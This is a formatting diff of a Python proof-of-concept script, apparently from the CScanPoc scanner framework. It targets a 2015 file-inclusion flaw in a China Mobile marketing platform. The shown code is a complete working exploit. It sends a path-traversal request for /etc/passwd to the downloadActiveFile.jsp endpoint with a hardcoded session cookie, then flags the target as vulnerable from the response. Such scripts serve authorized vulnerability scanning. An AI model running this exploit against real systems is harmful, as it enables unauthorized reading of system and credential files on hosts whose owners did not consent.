@@ -3,25 +3,27 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = '10086_0008' # 平台漏洞编号
-    name = '中国移动营销平台文件包含' # 漏洞名称
-    level = VulnLevel.MED # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
+    vuln_id = '10086_0008'  # 平台漏洞编号
+    name = '中国移动营销平台文件包含'  # 漏洞名称
+    level = VulnLevel.MED  # 漏洞危害级别
+    type = VulnType.LFI  # 漏洞类型
     disclosure_date = '2015-09-15'  # 漏洞公布时间
     desc = '''
         中国移动营销平台文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
-    ''' # 漏洞描述
-    ref = 'Unknown' #https://wooyun.shuimugan.com/bug/view?bug_no=129801
-    cnvd_id = 'Unknown' # cnvd漏洞编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # https://wooyun.shuimugan.com/bug/view?bug_no=129801
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = '中国移动'  # 漏洞组件名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
-    poc_id = 'b281f521-1e51-4641-b3d0-5bfbf6b62e54' # 平台 POC 编号
+    poc_id = 'b281f521-1e51-4641-b3d0-5bfbf6b62e54'  # 平台 POC 编号
     author = '国光'  # POC编写者
-    create_date = '2018-06-12' # POC创建时间
+    create_date = '2018-06-12'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -33,18 +35,20 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/jmad/active/downloadActiveFile.jsp?filePath=../../../../../../../../../etc/passwd'
             headers = {
-                'Cookie':'JSESSIONID=25D2815D24411520CD3D4B394A751455',
-                'Content-Type':'application/x-www-form-urlencoded'
+                'Cookie': 'JSESSIONID=25D2815D24411520CD3D4B394A751455',
+                'Content-Type': 'application/x-www-form-urlencoded'
             }
-            response = requests.get(vul_url,headers=headers)
-            if response.status_code ==200 and 'localhost' in response.content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+            response = requests.get(vul_url, headers=headers)
+            if response.status_code == 200 and 'localhost' in response.content:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
